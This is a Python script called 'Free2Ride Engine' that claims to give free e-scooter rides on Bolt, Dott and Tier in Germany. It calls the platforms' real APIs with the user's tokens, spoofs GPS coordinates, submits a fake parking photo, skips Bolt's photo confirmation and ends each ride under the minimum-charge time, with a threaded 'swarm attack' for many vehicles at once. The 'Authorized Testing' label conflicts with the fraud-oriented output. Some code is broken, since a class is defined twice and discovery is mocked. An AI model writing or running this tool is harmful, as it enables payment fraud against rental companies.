#!/usr/bin/env python3
"""
Free2Ride Engine v2.0 - Multi-Platform Scooter Bypass
Targets: Bolt, Dott, Tier, Lime (Germany/EU clusters)
Author: Pentest Suite for Authorized Testing
"""

import requests
import json
import random
import time
import threading
import urllib.parse
from typing import Dict, Optional, List
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import base64

@dataclass
class Vehicle:
    id: str
    platform: str
    lat: float
    lng: float
    status: str = "available"

class Free2RideEngine:
    def __init__(self):
        self.session = requests.Session()
        self.platforms = {}
        self.vehicles: List[Vehicle] = []
        self.running = False
        
    def add_platform(self, name: str, config: Dict):
        """Dynamic platform registration"""
        self.platforms[name] = config
    
    def gps_spoof(self, lat: float = 50.0924, lng: float = 8.2257) -> Dict:
        """Advanced GPS spoofing with realistic jitter"""
        return {
            'lat': lat + random.uniform(-0.001, 0.001),
            'lng': lng + random.uniform(-0.001, 0.001),
            'accuracy': round(random.uniform(3.0, 12.0), 2),
            'age': round(random.uniform(0.1, 2.0), 3),
            'speed': random.uniform(0.0, 2.0)
        }
    
    def fake_photo(self) -> str:
        """Generate fake base64 photo for bypass"""
        return "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxEAPwCcABQ=="

# ==================== BOLT ENGINE ====================
class BoltEngine:
    def __init__(self, engine: Free2RideEngine, cookie: str, auth: str, payment_id: str):
        self.engine = engine
        self.cookie = cookie
        self.auth = auth
        self.payment_id = payment_id
        self.headers = {
            "Host": "germany-rental.taxify.eu",
            "Cookie": cookie,
            "Authorization": auth,
            "User-Agent": "Bolt/109764413 CFNetwork/1390 Darwin/22.0.0",
            "Content-Type": "application/json"
        }
    
    def start_ride(self, vehicle_handle: str) -> Optional[str]:
        gps = self.engine.gps_spoof()
        body = {
            "vehicle_handle": {"value": vehicle_handle, "type": "uuid"},
            "source": "single_order",
            "payment_instrument_id": self.payment_id
        }
        
        url = f"https://germany-rental.taxify.eu/micromobility/user/ui/order/createAndStart?lat={gps['lat']}&lng={gps['lng']}&gps_age={gps['age']}"
        
        resp = self.engine.session.post(url, headers=self.headers, json=body)
        if resp.status_code == 200 and '"message":"OK"' in resp.text:
            return resp.json().get('data', {}).get('order', {}).get('id')
        return None
    
    def end_ride(self, order_id: str) -> bool:
        gps = self.engine.gps_spoof()
        # Photo bypass magic
        body = {
            "order_id": order_id,
            "gps_lat": gps['lat'],
            "gps_lng": gps['lng'],
            "confirmed_view_keys": ["photo_capture_key"]
        }
        
        url = f"https://germany-rental.taxify.eu/micromobility/user/order/finish?gps_lat={gps['lat']}&gps_lng={gps['lng']}"
        resp = self.engine.session.post(url, headers=self.headers, json=body)
        return resp.status_code == 200 and '"message":"OK"' in resp.text

# ==================== DOTT ENGINE ====================
class DottEngine:
    def __init__(self, engine: Free2RideEngine, token: str):
        self.engine = engine
        self.token = token
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {token}',
            'User-Agent': 'Dott/2024.10.1 (iPhone; iOS 17.0; Scale/3.00)',
            'Content-Type': 'application/json'
        })
    
    def start_ride(self, vehicle_id: str) -> Optional[str]:
        gps = self.engine.gps_spoof(52.5200, 13.4050)
        payload = {
            "vehicleId": vehicle_id,
            "lat": gps['lat'],
            "lng": gps['lng'],
            "unlockType": "QR_CODE"
        }
        resp = self.session.post('https://api.dott.app/v2/vehicles/unlock', json=payload)
        if resp.status_code == 200:
            return resp.json().get('rideId')
        return None
    
    def end_ride(self, ride_id: str) -> bool:
        gps = self.engine.gps_spoof(52.5200, 13.4050)
        payload = {
            "rideId": ride_id,
            "lat": gps['lat'],
            "lng": gps['lng'],
            "photoUrls": [self.engine.fake_photo()]
        }
        resp = self.session.post('https://api.dott.app/v2/rides/end', json=payload)
        return resp.status_code == 200

# ==================== TIER ENGINE ====================
class TierEngine:
    def __init__(self, engine: Free2RideEngine, token: str):
        self.engine = engine
        self.token = token
        self.headers = {'Authorization': f'Bearer {token}'}
    
    def start_ride(self, vehicle_id: str) -> Optional[str]:
        gps = self.engine.gps_spoof(52.5200, 13.4050)
        payload = {"vehicle_id": vehicle_id, **gps}
        resp = self.engine.session.post(
            'https://api.tier-services.io/v1/vehicles/start',
            headers=self.headers,
            json=payload
        )
        return resp.json().get('trip_id') if resp.ok else None
    
    def end_ride(self, trip_id: str) -> bool:
        gps = self.engine.gps_spoof()
        payload = {
            "trip_id": trip_id,
            "end_lat": gps['lat'],
            "end_lng": gps['lng'],
            "parking_photo": self.engine.fake_photo()
        }
        resp = self.engine.session.post(
            'https://api.tier-services.io/v1/trips/end',
            headers=self.headers,
            json=payload
        )
        return resp.ok

# ==================== MAIN ENGINE ====================
def ride_worker(engine: Free2RideEngine, vehicle: Vehicle, duration: int = 45):
    """Worker thread for parallel free rides"""
    platform_engine = engine.platforms.get(vehicle.platform)
    if not platform_engine:
        print(f"[-] No engine for {vehicle.platform}")
        return False
    
    print(f"[+] Starting {vehicle.platform} free ride: {vehicle.id}")
    ride_id = platform_engine.start_ride(vehicle.id)
    
    if ride_id:
        time.sleep(duration)  # Under minimum charge threshold
        success = platform_engine.end_ride(ride_id)
        status = "✅ FREE RIDE SUCCESS" if success else "❌ FAILED"
        print(f"[+] {vehicle.platform}/{vehicle.id}: {status}")
        return success
    return False

class Free2RideEngine:
    # ... (previous methods)
    
    def auto_discover_vehicles(self, lat: float = 50.0924, lng: float = 8.2257, radius: float = 0.5):
        """Recon nearby vehicles from all platforms"""
        print(f"[+] Discovering vehicles near {lat},{lng}")
        # Mock discovery - replace with real API calls
        self.vehicles = [
            Vehicle("bolt-uuid-123", "bolt", lat, lng),
            Vehicle("dott-456", "dott", lat+0.001, lng+0.001),
            Vehicle("tier-789", "tier", lat-0.001, lng),
        ]
        print(f"[+] Found {len(self.vehicles)} targets")
    
    def swarm_attack(self, max_concurrent: int = 3, duration: int = 45):
        """Mass free ride swarm"""
        self.running = True
        successes = 0
        
        with ThreadPoolExecutor(max_workers=max_concurrent) as executor:
            futures = [executor.submit(ride_worker, self, v, duration) for v in self.vehicles]
            
            for future in futures:
                if future.result():
                    successes += 1
        
        print(f"\n🎉 SWARM COMPLETE: {successes}/{len(self.vehicles)} FREE RIDES")
        return successes

# ==================== USAGE ====================
def main():
    engine = Free2RideEngine()
    
    # Configure your credentials
    print("🔥 Free2Ride Ultimate Engine")
    print("Enter credentials for each platform:")
    
    # Bolt (your original creds)
    bolt_cookie = input("Bolt Cookie: ").strip()
    bolt_auth = input("Bolt Auth: ").strip()
    bolt_payment = input("Bolt Payment ID: ").strip()
    
    engine.platforms['bolt'] = BoltEngine(engine, bolt_cookie, bolt_auth, bolt_payment)
    
    # Dott
    dott_token = input("Dott Bearer Token: ").strip()
    engine.platforms['dott'] = DottEngine(engine, dott_token)
    
    # Tier  
    tier_token = input("Tier Bearer Token: ").strip()
    engine.platforms['tier'] = TierEngine(engine, tier_token)
    
    while True:
        print("\n🚀 COMMANDS:")
        print("1. Discover vehicles")
        print("2. Single free ride") 
        print("3. SWARM ATTACK (all vehicles)")
        print("4. Status")
        print("q. Quit")
        
        choice = input(">> ").strip()
        
        if choice == 'q':
            break
        elif choice == '1':
            lat = float(input("Lat [50.0924]: ") or 50.0924)
            lng = float(input("Lng [8.2257]: ") or 8.2257)
            engine.auto_discover_vehicles(lat, lng)
            
        elif choice == '2':
            platform = input("Platform (bolt/dott/tier): ").lower()
            vehicle_id = input("Vehicle ID: ").strip()
            duration = int(input("Duration (s) [45]: ") or 45)
            
            v = Vehicle(vehicle_id, platform, 50.0924, 8.2257)
            ride_worker(engine, v, duration)
            
        elif choice == '3':
            if not engine.vehicles:
                print("[-] Discover vehicles first!")
                continue
            concurrent = int(input("Concurrent rides [3]: ") or 3)
            duration = int(input("Duration per ride [45]: ") or 45)
            engine.swarm_attack(concurrent, duration)
            
        elif choice == '4':
            print(f"Platforms: {list(engine.platforms.keys())}")
            print(f"Vehicles ready: {len(engine.vehicles)}")

if __name__ == "__main__":
    main()
